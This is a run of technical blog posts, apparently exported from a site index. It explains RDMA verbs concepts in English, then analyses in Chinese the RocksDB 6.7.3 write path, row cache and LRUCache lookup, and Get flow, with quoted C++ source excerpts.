As shown in the above figure, in RDMA programming, we use the command channel to call the kernel mode driver to establish the data channel, which allows us to completely bypass the kernel when moving data. Once this data channel is established, we can directly read and write the data buffer. The API to establish a data channel is an API called verbs. The verbs API is maintained by a Linux open-source project called the Open Fabrics Enterprise Distribution (OFED). Key ConceptsRDMA operation starts with memory operation. When you operate on memory, you are telling the kernel that this segment of memory is occupied by your application. So, you tell the HCA to address on this segment of memory and prepare to open a channel from the HCA card to this memory. We call this action registering a memory region MR (Memory Region). When registering, you can set the read and write permissions of the memory region (including local write, remote read, remote write, atomic, and bind). The Verbs API ibv_reg_mr can be used to register MR, which returns the remote and local keys of MR. The local key is used for the local HCA to access local memory. The remote key is provided to the remote HCA to access local memory. Once the MR is registered, we can use this memory for any RDMA operation. In the figure below, we can see the registered memory region (MR) and the buffer located within the memory region used by the communication queue. RDMA communication is based on a collection of three queues SQ (Send Queue), RQ (Receive Queue), and CQ (Completion Queue). The Send Queue (SQ) and Receive Queue (RQ) are responsible for scheduling work, they are always created in pairs, called Queue Pair (QP). The Completion Queue (CQ) is used to send notifications when instructions placed on the work queue are completed. When a user places instructions on the work queue, it means telling the HCA which buffers need to be sent or used to receive data. These instructions are small structures, called Work Requests (WR) or Work Queue Elements (WQE). A WQE mainly contains a pointer to a buffer. A WQE placed in the Send Queue (SQ) contains a pointer to a message to be sent; a pointer in a WQE placed in the Receive Queue points to a buffer, which is used to store the message to be received. RDMA is an asynchronous transmission mechanism. Therefore, we can place multiple send or receive WQEs in the work queue at once. The HCA will process these WQEs as quickly as possible in order. When a WQE is processed, the data is moved. Once the transmission is completed, the HCA creates a Completion Queue Element (CQE) with a successful status and places it in the Completion Queue (CQ). If the transmission fails for some reason, the HCA also creates a CQE with a failed status and places it in the CQ. Example (Send/Recv)Step 1: Both system A and B create their own QPs and CQs, and register the corresponding memory regions (MR) for the upcoming RDMA transfer. System A identifies a buffer, the data of which will be moved to system B. System B allocates an empty buffer to store data sent from system A. Step 2: System B creates a WQE and places it in its Receive Queue (RQ). This WQE contains a pointer, which points to a memory buffer to store received data. System A also creates a WQE and places it in its Send Queue (SQ), the pointer in the WQE points to a memory buffer, the data of which will be transmitted. Step 3: The HCA on system A always works on hardware, checking if there are any WQEs in the send queue. The HCA will consume the WQE from system A and send the data in the memory region to system B as a data stream. When the data stream starts to arrive at system B, the HCA on system B consumes the WQE from system B and puts the data into the designated buffer. The data stream transmitted on the high-speed channel completely bypasses the operating system kernel. Note: The arrows on the WQE represent pointers (addresses) to user space memory. In receive/send mode, both parties need to prepare their own WQEs (WorkQueue) in advance, and the HCA will write (CQ) after completion. Step 4: When the data movement is completed, the HCA creates a CQE. This CQE is placed in the Completion Queue (CQ), indicating that data transmission has been completed. The HCA creates a CQE for each consumed WQE. Therefore, placing a CQE in the completion queue of system A means that the send operation of the corresponding WQE has been completed. Similarly, a CQE will also be placed in the completion queue of system B, indicating that the receive operation of the corresponding WQE has been completed. If an error occurs, the HCA will still create a CQE. The CQE contains a field to record the transmission status. In IB or RoCE, the total time to transmit data in a small buffer is about 1.3µs. By simultaneously creating a lot of WQEs, data stored in millions of buffers can be transmitted in one second. RDMA Operation DetailsIn RDMA transfer, Send/Recv is a bilateral operation, i.e., it requires the participation of both communicating parties, and Recv must be executed before Send so that the other party can send data. Of course, if the other party does not need to send data, the Recv operation can be omitted. Therefore, this process is similar to traditional communication. The difference lies in RDMA’s zero-copy network technology and kernel bypass, which results in low latency and is often used for transmitting short control messages. Write/Read is a unilateral operation, as the name suggests, read/write operations are executed by one party. In actual communication, Write/Read operations are executed by the client, and the server does not need to perform any operations. In RDMA Write operation, the client pushes data directly from the local buffer into the continuous memory block in the remote QP’s virtual space (physical memory may not be continuous). Therefore, it needs to know the destination address (remote addr) and access rights (remote key). In RDMA Read operation, the client directly fetches data from the continuous memory block in the remote QP’s virtual space and pulls it into the local destination buffer. Therefore, it needs the memory address and access rights of the remote QP. Unilateral operations are often used for bulk data transfer. It can be seen that in the unilateral operation process, the client needs to know the remote addr and remote key of the remote QP. These two pieces of information can be exchanged through Send/Recv operations. RDMA Unilateral Operation (READ/WRITE)READ and WRITE are unilateral operations, where only the source and destination addresses of the information need to be clearly known at the local end. The remote application does not need to be aware of this communication, and the reading or writing of data is completed through RDMA between the network card and the application Buffer, and then returned to the local end by the remote network card as encapsulated messages. For unilateral operations, take storage in the context of a storage network as an example, the READ process is as follows: First, A and B establish a connection, and the QP has been created and initialized. The data is archived at B’s buffer address VB. Note that VB should be pre-registered with B’s network card (and it is a memory region) and get the returned remote key, which is equivalent to the permission to operate this buffer with RDMA. B encapsulates the data address VB and key into a dedicated message and sends it to A, which is equivalent to B handing over the operation right of the data buffer to A. At the same time, B registers a WR in its WQ to receive the status returned by A for data transmission. After A receives the data VB and remote key sent by B, the network card will package them together with its own storage address VA into an RDMA READ request and send this message request to B. In this process, both A and B can store B’s data to A’s VA virtual address without any software participation. After A completes the storage, it will return the status information of the entire data transfer to B. The WRITE process is similar to READ. The unilateral operation transmission method is the biggest difference between RDMA and traditional network transmission. It only needs to provide direct access to the remote virtual address, and does not require remote applications to participate, which is suitable for bulk data transmission. RDMA Bilateral Operation (SEND/RECEIVE)SEND/RECEIVE in RDMA is a bilateral operation, that is, the remote application must be aware of and participate in the completion of the transmission and reception. In practice, SEND/RECEIVE is often used for connection control messages, while data messages are mostly completed through READ/WRITE. Taking the bilateral operation as an example, the process of host A sending data to host B (hereinafter referred to as A and B) is as follows: First of all, A and B must create and initialize their own QP and CQ. A and B register WQE in their own WQ. For A, WQ = SQ, WQE describes a data that is about to be sent; for B, WQ = RQ, WQE describes a Buffer for storing data. A’s network card asynchronously schedules to A’s WQE, parses that this is a SEND message, and sends data directly to B from the buffer. When the data stream arrives at B’s network card, B’s WQE is consumed, and the data is directly stored in the storage location pointed to by the WQE. After A and B communication is completed, a completion message CQE will be generated in A’s CQ indicating that the sending is completed. At the same time, a completion message will be generated in B’s CQ indicating that the reception is completed. The processing of each WQE in WQ will generate a CQE. Bilateral operation is similar to the underlying Buffer Pool of traditional networks, and there is no difference in the participation process of the sender and receiver. The difference lies in zero-copy and kernel bypass. In fact, for RDMA, this is a complex message transmission mode, often used for transmitting short control messages. References https://xie.infoq.cn/article/49103d9cf895fa40a5cd397f8 https://zhuanlan.zhihu.com/p/55142557 https://zhuanlan.zhihu.com/p/55142547","link":"/2021/07/28/RDMA-Introduction/"},{"title":"RocksDB WriteImpl 流程","text":"本文对 RocksDB 6.7.3 版本的 WriteImpl 流程进行分析。 概述RocksDB 写入实现主要在 DBImpl::WriteImpl 中，过程主要分为以下三步： 把 WriteBatch 加入队列，多个 WriteBatch 成为一个 WriteGroup 将该 WriteGroup 所有的记录对应的日志写到 WAL 文件中 将该 WriteGroup 所有的 WriteBatch 中的一条或者多条记录写到内存中的 Memtable 中 其中，每个 WriteBatch 代表一个事务的提交，可以包含多条操作，可以通过调用 WriteBatch::Put/Delete 等操作将对应多条的 key/value 记录加入 WriteBatch 中。 源码分析WriteThread::JoinBatchGroup12345678910111213141516171819202122232425262728293031323334static WriteThread::AdaptationContext jbg_ctx(&quot;JoinBatchGroup&quot;);void WriteThread::JoinBatchGroup(Writer* w) { TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:Start&quot;, w); assert(w-&gt;batch != nullptr); bool linked_as_leader = LinkOne(w, &amp;newest_writer_); if (linked_as_leader) { SetState(w, STATE_GROUP_LEADER); } TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:Wait&quot;, w); if (!linked_as_leader) { /** * Wait util: * 1) An existing leader pick us as the new leader when it finishes * 2) An existing leader pick us as its follewer and * 2.1) finishes the memtable writes on our behalf * 2.2) Or tell us to finish the memtable writes in pralallel * 3) (pipelined write) An existing leader pick us as its follower and * finish book-keeping and WAL write for us, enqueue us as pending * memtable writer, and * 3.1) we become memtable writer group leader, or * 3.2) an existing memtable writer group leader tell us to finish memtable * writes in parallel. */ TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:BeganWaiting&quot;, w); AwaitState(w, STATE_GROUP_LEADER | STATE_MEMTABLE_WRITER_LEADER | STATE_PARALLEL_MEMTABLE_WRITER | STATE_COMPLETED, &amp;jbg_ctx); TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::JoinBatchGroup:DoneWaiting&quot;, w); }} 每个事务提交请求都会生成一个 WriteBatch 对象，进入 WriteImpl 函数后各自的线程首先调用 JoinBatchGroup 来加入到队列。该队列主要核心的实现在于 LinkOne 函数，通过 CAS 无锁将多个线程的请求组成请求链表： 123456789101112131415161718192021222324252627282930313233bool WriteThread::LinkOne(Writer* w, std::atomic&lt;Writer*&gt;* newest_writer) { assert(newest_writer != nullptr); assert(w-&gt;state == STATE_INIT); Writer* writers = newest_writer-&gt;load(std::memory_order_relaxed); while (true) { // If write stall in effect, and w-&gt;no_slowdown is not true, // block here until stall is cleared. If its true, then return // immediately if (writers == &amp;write_stall_dummy_) { if (w-&gt;no_slowdown) { w-&gt;status = Status::Incomplete(&quot;Write stall&quot;); SetState(w, STATE_COMPLETED); return false; } // Since no_slowdown is false, wait here to be notified of the write // stall clearing { MutexLock lock(&amp;stall_mu_); writers = newest_writer-&gt;load(std::memory_order_relaxed); if (writers == &amp;write_stall_dummy_) { stall_cv_.Wait(); // Load newest_writers_ again since it may have changed writers = newest_writer-&gt;load(std::memory_order_relaxed); continue; } } } w-&gt;link_older = writers; if (newest_writer-&gt;compare_exchange_weak(writers, w)) { return (writers == nullptr); } }} write_group 链表结构如下： 每个 writer 在头部插入，插入时如果发现 link_older 为空，则此 writer 成为 write_group 的 Leader（即链表尾为 Leader）。 在 JoinBatchGroup 中，如果 writer 不是 Leader（在后文把不是 Leader 的 writer 称为 Follower），则会调用 AwaitState 等待被唤醒。 PS：由于条件锁 Context Switches 代价高，Rocksdb 在 AwaitState 也做了优化，将 pthread_cond_wait 拆成 3 步来做，本文不对该优化进行详细描述。 WriteImpl 写日志1234567891011121314151617181920212223242526if (w.state == WriteThread::STATE_GROUP_LEADER) { ... last_batch_group_size_ = write_thread_.EnterAsBatchGroupLeader(&amp;w, &amp;wal_write_group); const SequenceNumber current_sequence = write_thread_.UpdateLastSequence(versions_-&gt;LastSequence()) + 1; ... if (w.status.ok() &amp;&amp; !write_options.disableWAL) { PERF_TIMER_GUARD(write_wal_time); stats-&gt;AddDBStats(InternalStats::kIntStatsWriteDoneBySelf, 1); RecordTick(stats_, WRITE_DONE_BY_SELF, 1); if (wal_write_group.size &gt; 1) { stats-&gt;AddDBStats(InternalStats::kIntStatsWriteDoneByOther, wal_write_group.size - 1); RecordTick(stats_, WRITE_DONE_BY_OTHER, wal_write_group.size - 1); } w.status = WriteToWAL(wal_write_group, log_writer, log_used, need_log_sync, need_log_dir_sync, current_sequence); } ... write_thread_.ExitAsBatchGroupLeader(wal_write_group, w.status);} 成为 Leader 的 writer，负责批量写入 WAL。在写 WAL 前，首先调用 EnterAsBatchGroupLeader 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778size_t WriteThread::EnterAsBatchGroupLeader(Writer* leader, WriteGroup* write_group) { assert(leader-&gt;link_older == nullptr); assert(leader-&gt;batch != nullptr); assert(write_group != nullptr); size_t size = WriteBatchInternal::ByteSize(leader-&gt;batch); // Allow the group to grow up to a maximum size, but if the // original write is small, limit the growth so we do not slow // down the small write too much. size_t max_size = max_write_batch_group_size_bytes; const uint64_t min_batch_size_bytes = max_write_batch_group_size_bytes / 8; if (size &lt;= min_batch_size_bytes) { max_size = size + min_batch_size_bytes; } leader-&gt;write_group = write_group; write_group-&gt;leader = leader; write_group-&gt;last_writer = leader; write_group-&gt;size = 1; Writer* newest_writer = newest_writer_.load(std::memory_order_acquire); // This is safe regardless of any db mutex status of the caller. Previous // calls to ExitAsGroupLeader either didn't call CreateMissingNewerLinks // (they emptied the list and then we added ourself as leader) or had to // explicitly wake us up (the list was non-empty when we added ourself, // so we have already received our MarkJoined). CreateMissingNewerLinks(newest_writer); // Tricky. Iteration start (leader) is exclusive and finish // (newest_writer) is inclusive. Iteration goes from old to new. Writer* w = leader; while (w != newest_writer) { w = w-&gt;link_newer; if (w-&gt;sync &amp;&amp; !leader-&gt;sync) { // Do not include a sync write into a batch handled by a non-sync write. break; } if (w-&gt;no_slowdown != leader-&gt;no_slowdown) { // Do not mix writes that are ok with delays with the ones that // request fail on delays. break; } if (w-&gt;disable_wal != leader-&gt;disable_wal) { // Do not mix writes that enable WAL with the ones whose // WAL disabled. break; } if (w-&gt;batch == nullptr) { // Do not include those writes with nullptr batch. Those are not writes, // those are something else. They want to be alone break; } if (w-&gt;callback != nullptr &amp;&amp; !w-&gt;callback-&gt;AllowWriteBatching()) { // dont batch writes that don't want to be batched break; } auto batch_size = WriteBatchInternal::ByteSize(w-&gt;batch); if (size + batch_size &gt; max_size) { // Do not make batch too big break; } w-&gt;write_group = write_group; size += batch_size; write_group-&gt;last_writer = w; write_group-&gt;size++; } TEST_SYNC_POINT_CALLBACK(&quot;WriteThread::EnterAsBatchGroupLeader:End&quot;, w); return size;} 在这里，通过 CreateMissingNewerLinks 函数来生成一个双向链表，使得可以从 Leader 开始顺序写。创建完成反向写请求链表之后，则开始计算有多少个写请求可以批量的进行，同时更新 write_group 中的批量写尺寸以及个数等信息，EnterAsBatchGroupLeader 取队列时会把此刻所有的 writer 一次性全取完。 该操作完成之后，则进入写 WAL 的流程了。调用 WriteToWAL，在 MergeBatch 函数中，将根据 write_group 生成一个 merged_batch，该 merged_batch 中记录着应当被写入 WAL 的内容。接着就通过 WriteToWAL 将 merged_batch 写入 WAL 中，这里会根据是否设置了 sync 来决定是否对 WAL 进行落盘操作。 PS：这里有一个优化点，在生成 merged_batch 的时候，假设该写请求的尺寸为一并且该请求需要写 WAL，则 merged_batch 直接复用了该写请求；反之则会复用一个 tmp_batch_ 对象避免频繁的生成 WriteBatch 对象。在写完 WAL 之后，假设复用了 tmp_batch_，则会清空该对象。 最后，调用 ExitAsBatchGroupLeader，该函数会决定该 Leader 是否为 STATE_MEMTABLE_WRITER_LEADER（MEMTABLE_WRITER_LEADER数量 &lt;= GROUP_LEADER数量），从而进行写 Memtable 流程。 WriteImpl 写 Memtable1234567891011121314151617181920212223242526272829303132333435WriteThread::WriteGroup memtable_write_group; if (w.state == WriteThread::STATE_MEMTABLE_WRITER_LEADER) { PERF_TIMER_GUARD(write_memtable_time); assert(w.ShouldWriteToMemtable()); write_thread_.EnterAsMemTableWriter(&amp;w, &amp;memtable_write_group); if (memtable_write_group.size &gt; 1 &amp;&amp; immutable_db_options_.allow_concurrent_memtable_write) { write_thread_.LaunchParallelMemTableWriters(&amp;memtable_write_group); } else { memtable_write_group.status = WriteBatchInternal::InsertInto( memtable_write_group, w.sequence, column_family_memtables_.get(), &amp;flush_scheduler_, &amp;trim_history_scheduler_, write_options.ignore_missing_column_families, 0 /*log_number*/, this, false /*concurrent_memtable_writes*/, seq_per_batch_, batch_per_txn_); versions_-&gt;SetLastSequence(memtable_write_group.last_sequence); write_thread_.ExitAsMemTableWriter(&amp;w, memtable_write_group); } } if (w.state == WriteThread::STATE_PARALLEL_MEMTABLE_WRITER) { assert(w.ShouldWriteToMemtable()); ColumnFamilyMemTablesImpl column_family_memtables( versions_-&gt;GetColumnFamilySet()); w.status = WriteBatchInternal::InsertInto( &amp;w, w.sequence, &amp;column_family_memtables, &amp;flush_scheduler_, &amp;trim_history_scheduler_, write_options.ignore_missing_column_families, 0 /*log_number*/, this, true /*concurrent_memtable_writes*/, false /*seq_per_batch*/, 0 /*batch_cnt*/, true /*batch_per_txn*/, write_options.memtable_insert_hint_per_batch); if (write_thread_.CompleteParallelMemTableWriter(&amp;w)) { MemTableInsertStatusCheck(w.status); versions_-&gt;SetLastSequence(w.write_group-&gt;last_sequence); write_thread_.ExitAsMemTableWriter(&amp;w, *w.write_group); } } RocksDB 有一个 allow_concurrent_memtable_write 的配置项，开启后可以并发写 memtable（memtable 能设置并发写，但是 WAL 文件不能，因为 WAL 是一个追加写的文件，多个 writer 必须要串行化），所以接下来分为串行写和并行写来进行分析。 串行写 MemtableLeader 调用 InsertInto，对 write_group 进行遍历，将 Leader 和 Follower 的 WriteBatch 写入。之后调用 ExitAsMemTableWriter，把所有 Follower 的状态设置为 STATE_COMPLETED，将它们唤醒，最后再把 Leader 的状态设置为 STATE_COMPLETED。 并行写 Memtable调用 LaunchParallelMemTableWriters，遍历 write_group 把 Leader 和 Follower 的状态都设置为 STATE_PARALLEL_MEMTABLE_WRITER，将等待的线程唤醒。最后所有 writer 通过调用 InsertInto 来将 WriteBatch 写入 MemTable 中。writer 完成了 MemTable 的写操作之后，都会调用 CompleteParallelMemTableWriter 函数。该函数会将该 write_group 中运行的任务数减一，当运行中的任务数为零的时候就代表了所有的线程都完成了操作，调用 ExitAsMemTableWriter 把 Leader 的状态设置为 STATE_COMPLETED，反之则会进入等待状态，等待当前其他的写任务完成。 无论是串行写还是并行写，写入 MemTable 完成之后，还有一项工作，就是在取队列时获取 newest_writer_ 和当前时间点处，可能又有很多的写请求产生了，所以批量任务中最后一个完成的线程必须负责重新指定 Leader 给堆积写请求链表的尾部，让其接过 Leader 角色继续进行批量提交。可以看到，串行写和并行写最后都会调用 ExitAsMemTableWriter，正是在该函数中完成了该项工作。 PS：在高并发场景下，Follow 调用 AwaitState 的平均等待时延差不多是写 WAL 时延的两倍。因为获取 newest_writer_ 后，可能又来了许多写请求，这些写请求先要等待此时的 Leader 完成写流程，还要等待下个 Leader，也就是和这些写请求是同一个 write_group 的 Leader 完成写 WAL 才能被唤醒。 回顾 参考 Rocksdb Source Code 6.7.3 rocksdb写流程DBImpl::WriteImpl()源代码分析 RocksDB写入流程 RocksDB 写流程分析","link":"/2021/04/05/RocksDB-WriteImpl-%E6%B5%81%E7%A8%8B/"},{"title":"从 Row Cache 的 Get 来看 Rocksdb LRUCache","text":"本文简单介绍 RocksDB 6.7.3 版本的 LRUCache。 Row CacheRow Cache 对查找的 key 在 SST 中对应的 value 进行 cache。如果 row_cache 打开，在 TableCache::Get 函数中，会调用 CreateRowCacheKeyPrefix 和 GetFromRowCache 获取 row cache 的 key（fd_number + seq_no + user_key），在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，得到 row cache 缓存的 row_handle，构造 found_row_cache_entry 指针指向 value，利用 Cleannable 类的特性，可以通过减少一次对 value 内存拷贝的方式来获取最终的结果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Status TableCache::Get(const ReadOptions&amp; options, const InternalKeyComparator&amp; internal_comparator, const FileMetaData&amp; file_meta, const Slice&amp; k, GetContext* get_context, const SliceTransform* prefix_extractor, HistogramImpl* file_read_hist, bool skip_filters, int level) { ... if (ioptions_.row_cache &amp;&amp; !get_context-&gt;NeedToReadSequence()) { auto user_key = ExtractUserKey(k); CreateRowCacheKeyPrefix(options, fd, k, get_context, row_cache_key); done = GetFromRowCache(user_key, row_cache_key, row_cache_key.Size(), get_context); if (!done) { row_cache_entry = &amp;row_cache_entry_buffer; } } ...}void TableCache::CreateRowCacheKeyPrefix(const ReadOptions&amp; options, const FileDescriptor&amp; fd, const Slice&amp; internal_key, GetContext* get_context, IterKey&amp; row_cache_key) { uint64_t fd_number = fd.GetNumber(); uint64_t seq_no = 0; ... AppendVarint64(&amp;row_cache_key, fd_number); AppendVarint64(&amp;row_cache_key, seq_no);}bool TableCache::GetFromRowCache(const Slice&amp; user_key, IterKey&amp; row_cache_key, size_t prefix_size, GetContext* get_context) { bool found = false; row_cache_key.TrimAppend(prefix_size, user_key.data(), user_key.size()); if (auto row_handle = ioptions_.row_cache-&gt;Lookup(row_cache_key.GetUserKey())) { // Cleanable routine to release the cache entry Cleanable value_pinner; auto release_cache_entry_func = [](void* cache_to_clean, void* cache_handle) { ((Cache*)cache_to_clean)-&gt;Release((Cache::Handle*)cache_handle); }; auto found_row_cache_entry = static_cast&lt;const std::string*&gt;(ioptions_.row_cache-&gt;Value(row_handle)); // If it comes here value is located on the cache. // found_row_cache_entry points to the value on cache, // and value_pinner has cleanup procedure for the cached entry. // After replayGetContextLog() returns, get_context.pinnable_slice_ // will point to cache entry buffer (or a copy based on that) and // cleanup routine under value_pinner will be delegated to // get_context.pinnable_slice_. Cache entry is released when // get_context.pinnable_slice_ is reset. value_pinner.RegisterCleanup(release_cache_entry_func, ioptions_.row_cache.get(), row_handle); replayGetContextLog(*found_row_cache_entry, user_key, get_context, &amp;value_pinner); RecordTick(ioptions_.statistics, ROW_CACHE_HIT); found = true; } else { RecordTick(ioptions_.statistics, ROW_CACHE_MISS); } return found;} LRUCache 类 Cache定义了 Cache 的接口，包括 Insert, Lookup, Release 等操作。 ShardedCache支持对 Cache 进行分桶，分桶数量为 2^num_shard_bits，每个桶的容量相等。分桶的依据是取 key 的 hash 值的高 num_shard_bits 位。 LRUCache实现了 ShardedCache，维护了一个 LRUCacheShard 数组，一个 shard 就是一个桶。 CacheShard定义了一个桶的接口，包括 Insert, Lookup, Release 等操作，Cache 的相关调用经过分桶处理后，都会调用指定桶的对应操作。 LRUCacheShard实现了 CacheShard，维护了一个 LRU list 和 hash table，用来实现 LRU 策略，他们的成员类型都是 LRUHandle。 LRUHandle保存 key 和 value 的单元，并且包含前向和后续指针，可以组成双向循环链表作为 LRU list。 LRUHandleTablehash table 的实现，根据 key 再次做了分组处理，并且尽量保证每个桶中只有一个元素，元素类型为 LRUHandle。提供了Lookup, Insert, Remove操作。 Lookup在 GetFromRowCache 中，会调用 row_cache-&gt;Lookup，这里实际调用的是 ShardedCache::Lookup 1234Cache::Handle* ShardedCache::Lookup(const Slice&amp; key, Statistics* /*stats*/) { uint32_t hash = HashSlice(key); return GetShard(Shard(hash))-&gt;Lookup(key, hash);} 获取哈希值，根据 hash 值的高 num_shard_bits 位获取 shard，再调用 LRUCacheShard::Lookup 1234567891011121314Cache::Handle* LRUCacheShard::Lookup(const Slice&amp; key, uint32_t hash) { MutexLock l(&amp;mutex_); LRUHandle* e = table_.Lookup(key, hash); if (e != nullptr) { assert(e-&gt;InCache()); if (!e-&gt;HasRefs()) { // The entry is in LRU since it's in hash and has no external references LRU_Remove(e); } e-&gt;Ref(); e-&gt;SetHit(); } return reinterpret_cast&lt;Cache::Handle*&gt;(e);} LRUCacheShard::Lookup 中又会调用 LRUHandleTable::Lookup，在 FindPointer 中，hash 到特定位置后，如果当前位置的 hash 和当前 hash 不一样，或者 key 不一样，并且指针也不为空，则继续向下找，直到找到 1234567891011LRUHandle* LRUHandleTable::Lookup(const Slice&amp; key, uint32_t hash) { return *FindPointer(key, hash);}LRUHandle** LRUHandleTable::FindPointer(const Slice&amp; key, uint32_t hash) { LRUHandle** ptr = &amp;list_[hash &amp; (length_ - 1)]; while (*ptr != nullptr &amp;&amp; ((*ptr)-&gt;hash != hash || key != (*ptr)-&gt;key())) { ptr = &amp;(*ptr)-&gt;next_hash; } return ptr;} 总结LRUCache 就是把多个 LRUCacheShard 组合起来，每个 LRUCacheShard 维护了一个 LRUHandle list 和 hash table，LRUHandleTable 用拉链法实现哈希表。通过对缓存的 Lookup 调用链分析可以看到具体的实现非常简练。 参考 Rocksdb Source Code 6.7.3 RocksDB. LRUCache源码分析 RocksDB中的LRUCache","link":"/2021/01/18/Rocksdb-Cache/"},{"title":"RocksDB Get 流程","text":"本文对 RocksDB 6.7.3 版本的 Get 流程进行分析。 概述(1) 获取当前的 SuperVersion。SuperVersion 用于管理 CF 的元数据，如当前版本号、内存中的 MemTable 和 Immutable MemTable、SST 文件信息等: 123456Struct SuperVersion { MemTable* mem; MemTableListVersion* imm; Version* current; ...} (2) 从内存读: 尝试从第一步 SuperVersion 中引用的 MemTable 以及Immutable MemTable 中获取对应的值 (3) 从持久化设备读: 首先通过 Table cache 获取到文件的元数据，如布隆过滤器(Bloom Filters)和数据块索引(Indexes)， 如果 Block cache 中缓存了 SST 的数据块，如果命中那就直接读取成功，否则便需要从 SST 中读取数据块并插入到 Block cache 源码分析DBImpl::Get12345678Status DBImpl::Get(const ReadOptions&amp; read_options, ColumnFamilyHandle* column_family, const Slice&amp; key, PinnableSlice* value) { GetImplOptions get_impl_options; get_impl_options.column_family = column_family; get_impl_options.value = value; return GetImpl(read_options, key, get_impl_options);} Rocksdb 的 Get 接口 DBImpl::Get 其实现主要靠 DBImpl::GetImpl 函数调用。 DBImpl::GetImpl1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950Status DBImpl::GetImpl(const ReadOptions&amp; read_options, const Slice&amp; key, ... SuperVersion* sv = GetAndRefSuperVersion(cfd); ... SequenceNumber snapshot; if (read_options.snapshot != nullptr) { if (get_impl_options.callback) { snapshot = get_impl_options. } else { snapshot = reinterpret_cast&lt;const SnapshotImpl*&gt;(read_options.snapshot)-&gt;number_; } } else { .... snapshot = last_seq_same_as_publish_seq_ ? versions_-&gt;LastSequence() : versions_-&gt;LastPublishedSequence(); ... } } ... if (!skip_memtable) { ... if (sv-&gt;mem-&gt;Get(lkey, get_impl_options.value-&gt;GetSelf(), &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, read_options, get_impl_options.callback, get_impl_options.is_blob_index)) { ... } else if ((s.ok() || s.IsMergeInProgress()) &amp;&amp; sv-&gt;imm-&gt;Get(lkey, get_impl_options.value-&gt;GetSelf(), &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, read_options, get_impl_options.callback, get_impl_options.is_blob_index)) { ... } ... } if (!done) { sv-&gt;current-&gt;Get( read_options, lkey, get_impl_options.value, &amp;s, &amp;merge_context, &amp;max_covering_tombstone_seq, get_impl_options.get_value ? get_impl_options.value_found : nullptr, nullptr, nullptr, get_impl_options.get_value ? get_impl_options.callback : nullptr, get_impl_options.get_value ? get_impl_options.is_blob_index : nullptr, get_impl_options.get_value); ... } ...} DBImpl::GetImpl 获取 SuperVersion 的信息，如果用户未指定 snapshot，需要获取当前的 snapshot。读取时不对 key 加锁，能读到什么数据完全取决于 Options 传入的 snapshot。 SuperVersion 中按照数据的新旧程度排序 MemTable -&gt; MemTableListVersion -&gt; Version，依次按序查找，如果在新的数据中找到符合 snapshot 规则的结果，就可以立即返回，完成本次查找。 MemTable::Get123456789101112131415161718192021222324252627282930313233bool MemTable::Get(const LookupKey&amp; key, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, SequenceNumber* seq, const ReadOptions&amp; read_opts, ReadCallback* callback, bool* is_blob_index, bool do_merge) { ... if (bloom_filter_ &amp;&amp; !may_contain) { // iter is null if prefix bloom says the key does not exist PERF_COUNTER_ADD(bloom_memtable_miss_count, 1); *seq = kMaxSequenceNumber; } else { if (bloom_filter_) { PERF_COUNTER_ADD(bloom_memtable_hit_count, 1); } GetFromTable(key, *max_covering_tombstone_seq, do_merge, callback, is_blob_index, value, s, merge_context, seq, &amp;found_final_value, &amp;merge_in_progress); } ...}void MemTable::GetFromTable(const LookupKey&amp; key, SequenceNumber max_covering_tombstone_seq, bool do_merge, ReadCallback* callback, bool* is_blob_index, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* seq, bool* found_final_value, bool* merge_in_progress) { ... table_-&gt;Get(key, &amp;saver, SaveValue); *seq = saver.seq;} 利用 MemTableRep 的 Get 函数进行查找（以 SkipListRep 实现为例，在 skiplist 中进行查找，从 seek 到的位置开始向后遍历，遍历 entry 是否符合SaveValue 定义的规则）。SaveValue 函数查看当前 entry 是否还是当前查找的 key，如果不是则返回；查看当前 entry 的 snapshot 是否小于或等于需要查找的 snapshot，不符合则继续循环。如果 entry 的snapshot 符合上述条件，那么则跳出循环，返回查找结果。 MemTableListVersion::Get123456789bool Get(const LookupKey&amp; key, std::string* value, Status* s, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, const ReadOptions&amp; read_opts, ReadCallback* callback = nullptr, bool* is_blob_index = nullptr) { SequenceNumber seq; return Get(key, value, s, merge_context, max_covering_tombstone_seq, &amp;seq, read_opts, callback, is_blob_index);} MemTableListVersion 用链表的形式保存了所有 Immutable memtable 的结构，查找时，按时间序依次查找于每一个 memtable，如果任何一个 memtable 查找到结果则立即返回，即返回最新的返回值。具体 memtable 查找见上述 MemTable::Get 接口。 Version::Get123456789101112131415161718192021222324252627void Version::Get(const ReadOptions&amp; read_options, const LookupKey&amp; k, PinnableSlice* value, Status* status, MergeContext* merge_context, SequenceNumber* max_covering_tombstone_seq, bool* value_found, bool* key_exists, SequenceNumber* seq, ReadCallback* callback, bool* is_blob, bool do_merge) { ... FilePicker fp( storage_info_.files_, user_key, ikey, &amp;storage_info_.level_files_brief_, storage_info_.num_non_empty_levels_, &amp;storage_info_.file_indexer_, user_comparator(), internal_comparator()); FdWithKeyRange* f = fp.GetNextFile(); while (f != nullptr) { ... *status = table_cache_-&gt;Get( read_options, *internal_comparator(), *f-&gt;file_metadata, ikey, &amp;get_context, mutable_cf_options_.prefix_extractor.get(), cfd_-&gt;internal_stats()-&gt;GetFileReadHist(fp.GetHitFileLevel()), IsFilterSkipped(static_cast&lt;int&gt;(fp.GetHitFileLevel()), fp.IsHitFileLastInLevel()), fp.GetCurrentLevel()); ... f = fp.GetNextFile(); } ...} GetNextFile 函数会遍历所有的 level，然后再遍历每个 level 的所有的文件，这里会对 level 0 的文件做一个特殊处理，这是因为只有 level 0 的 SST 的 range 不是有序的，因此我们每次查找需要查找所有的文件，也就是会一个个的遍历；而在非 level 0，我们只需要按照二分查找来得到对应的文件即可，如果二分查找不存在，那么我就需要进入下一个 level 进行查找。 调用 TableCache::Get 遍历单个 SST 文件，如果查找到结果立即返回。 